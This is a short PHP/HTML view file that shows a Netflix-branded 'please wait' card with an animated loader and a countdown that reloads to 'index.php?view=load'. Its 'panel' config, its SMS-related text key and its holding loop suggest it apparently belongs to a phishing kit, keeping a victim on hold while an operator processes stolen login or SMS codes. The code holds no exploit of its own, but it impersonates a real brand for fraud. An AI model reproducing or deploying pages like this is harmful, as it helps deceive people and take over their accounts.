<?php
require_once 'config/panel.php';
$title = "Netflix";
$refreshId = md5(time());
ob_start();
?>
<div class="container d-flex flex-column justify-content-center align-items-center my-5">
    <div class="card shadow-lg border-0" style="max-width: 520px;">
        <div class="card-header bg-danger text-white text-center py-4">
            <h2 class="mb-0"><?= lang('xwait1'); ?></h2>
        </div>
        <div class="card-body bg-dark text-white text-center px-4 py-5">
            <div class="mb-4">
                <div class="approval-loader mx-auto mb-3">
                    <span class="dot dot-1"></span>
                    <span class="dot dot-2"></span>
                    <span class="dot dot-3"></span>
                </div>
                <p class="fw-semibold mb-2"><?= lang('xwait2'); ?></p>
                <p class="text-muted mb-0"><?= lang('xwait3'); ?></p>
            </div>

            <div class="bg-secondary rounded-3 py-3 px-4 text-start">
                <p class="mb-2"><strong><?= lang('xwait4'); ?></strong></p>
                <p class="mb-0 text-warning"><?= lang('xsms7'); ?></p>
            </div>

            <div class="mt-4 small text-uppercase text-muted">
                <?= sprintf(lang('xwait5'), '<span id="refreshCountdown">05</span>'); ?>
            </div>
        </div>
        <div class="card-footer bg-transparent text-center pb-4">
            <button class="btn btn-outline-danger px-5" id="refreshNow"><?= lang('xwait6'); ?></button>
        </div>
    </div>
</div>

<style>
    .approval-loader {
        width: 72px;
        display: flex;
        justify-content: space-between;
    }

    .approval-loader .dot {
        width: 14px;
        height: 14px;
        border-radius: 50%;
        background-color: #dc3545;
        opacity: 0.3;
        animation: pulse 1.5s infinite ease-in-out;
    }

    .approval-loader .dot-2 {
        animation-delay: 0.2s;
    }

    .approval-loader .dot-3 {
        animation-delay: 0.4s;
    }

    @keyframes pulse {
        0%, 100% {
            opacity: 0.3;
            transform: scale(0.9);
        }
        50% {
            opacity: 1;
            transform: scale(1.1);
        }
    }
</style>

<script>
    const REFRESH_INTERVAL = 5000;
    const countdownEl = document.getElementById('refreshCountdown');
    const refreshBtn = document.getElementById('refreshNow');
    const redirectUrl = 'index.php?view=load&id=<?= $refreshId; ?>';

    let remaining = Math.floor(REFRESH_INTERVAL / 1000);
    countdownEl.textContent = remaining.toString().padStart(2, '0');

    const intervalId = setInterval(() => {
        remaining -= 1;
        if (remaining <= 0) {
            clearInterval(intervalId);
            window.location.href = redirectUrl;
        } else {
            countdownEl.textContent = remaining.toString().padStart(2, '0');
        }
    }, 1000);

    refreshBtn.addEventListener('click', () => {
        clearInterval(intervalId);
        window.location.href = redirectUrl;
    });
</script>
<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>
